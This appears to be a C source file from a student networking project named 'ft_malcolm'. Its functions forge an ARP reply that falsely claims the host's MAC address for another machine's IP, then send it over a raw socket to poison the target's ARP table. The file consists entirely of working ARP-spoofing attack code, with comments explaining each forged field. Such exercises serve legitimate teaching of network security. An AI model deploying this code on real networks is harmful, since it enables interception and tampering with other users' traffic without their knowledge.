#include "ft_malcolm.h"

/*
Ethernet Header
  |- Destination MAC Address
  |- Source MAC Address
  |- EtherType (ARP: 0x0806)

ARP Header
  |- Hardware Type (Ethernet: 1)
  |- Protocol Type (IPv4: 0x0800)
  |- Hardware Address Length (MAC address length: 6)
  |- Protocol Address Length (IPv4 address length: 4)
  |- Operation (ARP Reply: 2)
  |- Sender MAC Address
  |- Sender IP Address
  |- Target MAC Address
  |- Target IP Address

Payload (if any)
*/

_mc_t_packet    _mc_create_packet_for_spoofing(void)
{
    // Create the ARP reply packet
    _mc_t_packet    packet = {0};
    packet.ethernet_header = *_mc_g_data.ethernet_header;
    packet.arp_packet = *_mc_g_data.arp_packet;

    /* Spoofing the ethernet header */

    // The destination MAC is set to the target's MAC address
	_mc_memcpy(packet.ethernet_header.h_dest, _mc_g_data.ethernet_header->h_source, ETH_ALEN);
    // The source MAC is falsly set to the host's MAC address
	_mc_memcpy(packet.ethernet_header.h_source, _mc_g_data.host_mac, ETH_ALEN);

    /* Spoofing the arp packet */

    // The target MAC is replaced by the ARP request's MAC address
	_mc_memcpy(packet.arp_packet.arp_tha, packet.arp_packet.arp_sha, ETH_ALEN);
    // Again, the source MAC is falsly set to the host's MAC address
	_mc_memcpy(packet.arp_packet.arp_sha, _mc_g_data.host_mac, ETH_ALEN);
    // The sender's IP is falsly set to the former target IP address of the ARP request
	_mc_memcpy(packet.arp_packet.arp_spa, packet.arp_packet.arp_tpa, _MC_IPV4_BYTE_SIZE);
    // The target's IP is the one given from the command line
	_mc_memcpy(packet.arp_packet.arp_tpa, _mc_g_data.target_ip, _MC_IPV4_BYTE_SIZE);

    return packet;
}

void	_mc_run_arp_spoofing(void)
{
	_mc_t_packet	packet = _mc_create_packet_for_spoofing();

    /* Send the fake ARP reply using the custom packet
        (Destination port is inside src_addr) */
    printf(_MC_YELLOW_COLOR
        "Now sending an ARP reply to the target address with spoofed source..."
        _MC_RESET_COLOR "\n\n"
    );

    printf("Ethernet header:\n");
    printf("h_dest: ");_mc_print_mac(packet.ethernet_header.h_dest);
	printf("h_src: "); _mc_print_mac(packet.ethernet_header.h_source);

    printf("ARP header:\n");
	printf("tha: ");_mc_print_mac(packet.arp_packet.arp_tha);
	printf("sha: ");_mc_print_mac(packet.arp_packet.arp_sha);
	printf("spa: ");_mc_print_ip(packet.arp_packet.arp_spa);
	printf("tpa: ");_mc_print_ip(packet.arp_packet.arp_tpa);

    int ret = sendto(
        _mc_g_data.raw_sockfd, &packet, sizeof(_mc_t_packet), 0,
        (struct sockaddr *)&_mc_g_data.src_addr, sizeof(struct sockaddr_ll)
    );

    if (ret <= 0) fprintf(stderr, "Failed to send the ARP reply\n");
    else
        printf("\nSent an ARP reply packet, you may now check the arp table on the target\n");
}